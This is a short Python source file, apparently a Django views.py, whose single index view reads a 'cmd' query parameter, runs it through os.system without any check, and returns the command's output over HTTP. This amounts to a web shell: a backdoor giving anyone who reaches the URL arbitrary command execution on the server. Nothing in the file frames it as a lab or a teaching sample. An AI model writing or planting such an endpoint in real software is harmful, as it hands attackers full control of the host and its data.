#!/usr/bin/python3

import cgi, cgitb
import os
from django.http import HttpResponse

# Create your views here.
def index(request):
    newcmd = request.GET.get('cmd')
    extended_cmd = newcmd + " > tmp.txt"
    os.system(extended_cmd)
    f = open('tmp.txt', 'r')
    file_contents = f.read()
    f.close()
    os.remove("tmp.txt")
    return HttpResponse(file_contents, content_type="text/plain; charset=utf-8")
